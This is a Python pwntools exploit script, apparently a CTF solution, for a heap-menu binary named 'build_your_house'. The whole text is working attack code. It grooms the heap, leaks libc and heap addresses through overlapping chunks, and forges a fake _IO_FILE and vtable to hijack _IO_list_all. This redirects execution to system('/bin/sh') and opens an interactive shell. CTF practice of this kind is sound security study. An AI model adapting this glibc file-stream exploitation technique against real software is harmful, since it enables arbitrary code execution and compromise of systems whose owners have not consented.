from pwn import *
context.log_level='debug'

p = process("build_your_house")
elf = ELF("build_your_house")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add_n(size,content):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('How big a house do you want to build?')
    p.sendline(str(size))
    p.recvuntil('How do you want to decorate your house?')
    p.sendline(str(content))
def add_0(size,content):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('How big a house do you want to build?')
    p.sendline(str(size))
    p.recvuntil('How do you want to decorate your house?')
    p.send(str(content))
def free(id):
    p.sendlineafter("ice:",str(2))
    p.sendlineafter("remove?",str(id))
def show(index):
    p.sendlineafter('ice:','3')
    p.sendlineafter('view?',str(index))


add_n(0x38,'x00')#idx 0  0x40
add_n(0x38,'x01')#idx 1  0x80
add_n(0x38,'x02')#idx 2  0xc0
add_n(0x38,'x03')#idx 3  0x100  
add_n(0x38,'x00')#idx 4  0x140

add_n(0x38,'x00')#idx 5 

add_n(0x38,'x06')#idx 6#0x190
add_n(0x38,'x07')#idx 7#0x1d0
add_n(0x38,'x06')#idx 8#0x210
add_n(0x38,'x07')#idx 9
add_n(0x38,'x06')#idx 10
for i in range(5):
    free(i)
p.recvuntil('Choice:')
p.sendline('1'*0x500)

add_0(0x28,'\x01'*0x28)
add_n(0x38,'\x01')#1
add_n(0x18,'\x00')#2
add_n(0x38,'\x00')#3
add_n(0x38,'\x00')#4
add_n(0x18,'\x01')#11
free(5)
free(1)
p.recvuntil('Choice:')
p.sendline('1'*0x500)

add_n(0x38,'\x01')#1
show(2)
p.recv()
libc_base = u64(p.recv(6).strip('\n').ljust(8,'\x00')) - 88 -3951392
print hex(libc_base)
add_n(0x18,'\x00')#5
add_n(0x18,'\x00')#12
free(12)
free(5)
show(2)
p.recv()
heap_base = u64(p.recv(6).strip('\n').ljust(8,'\x00')) - 0x90
print hex(heap_base)

free(4)
add_n(0x28,'\x01'*0x18 + p64(0x41)) # must keep the fastbin size = 0x41
system = libc_base + libc.symbols['system']
io_list_all = libc_base + libc.symbols['_IO_list_all']

fake_file = '/bin/sh\x00'+p64(0x61)#to small bin
fake_file += p64(0)+p64(io_list_all-0x10)
fake_file += p64(0) + p64(1)#_IO_write_base < _IO_write_ptr
fake_file = fake_file.ljust(0x38,'\x00')
add_n(0x38,fake_file)

free(6)
fake_vtable = heap_base + 0x210
add_n(0x38,'\x00'*0x28 + p64(fake_vtable)+p64(0))

free(8)
add_n(0x38,p64(0)*3 +p64(system))


p.recvuntil('Choice:')
p.sendline('1')
p.recvuntil('How big a house do you want to build?')
p.sendline(str(0x40))

p.interactive()